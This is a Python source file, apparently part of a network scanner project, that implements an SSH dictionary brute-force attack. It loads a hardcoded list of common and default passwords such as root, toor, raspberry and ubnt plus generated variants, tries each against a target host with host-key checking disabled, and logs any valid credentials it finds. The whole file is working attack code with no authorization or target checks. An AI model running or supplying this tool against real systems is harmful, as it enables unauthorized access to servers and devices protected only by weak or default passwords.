import asyncio
import asyncssh
from scanner.logger import setup_logger
logger = setup_logger()
COMMON_PASSWORDS = [
    "admin", "password", "123456", "12345678", "1234", "qwerty", "12345", 
    "123456789", "root", "admin123", "password123", "admin1", "toor",
    "ubnt", "pi", "raspberry", "kali", "user"
]
PASSWORDS = COMMON_PASSWORDS + [f"pass{i}" for i in range(100)] + [f"admin{i}" for i in range(100)]
async def test_ssh_login(ip: str, port: int, username: str, password: str) -> bool:
    """Attempts an SSH login using asyncssh."""
    try:
        async with asyncssh.connect(
            ip, port=port, username=username, password=password, 
            known_hosts=None, client_keys=None,
            login_timeout=1.0, connect_timeout=1.0
        ) as conn:
            return True
    except asyncssh.PermissionDenied:
        return False
    except Exception as e:
        return False
async def run_bruteforce(ip: str, port: int, username: str, protocol: str, delay_ms: int = 0):
    """Runs a brute-force dictionary attack against a specific service."""
    logger.info(f"Starting brute-force against {ip}:{port} (User: {username}, Protocol: {protocol})")
    if protocol.upper() == "SSH" or port == 22:
        for pwd in PASSWORDS:
            if delay_ms > 0:
                await asyncio.sleep(delay_ms / 1000.0)
            success = await test_ssh_login(ip, port, username, pwd)
            if success:
                logger.info(f"\033[92m[SUCCESS] Found valid credentials for {ip}:{port} -> {username}:{pwd}\033[0m")
                return {"success": True, "password": pwd}
        logger.info(f"Brute-force against {ip}:{port} completed. No valid password found.")
        return {"success": False, "message": "No valid password found in dictionary"}
    return {"success": False, "message": f"Unsupported protocol/port: {protocol}/{port}"}
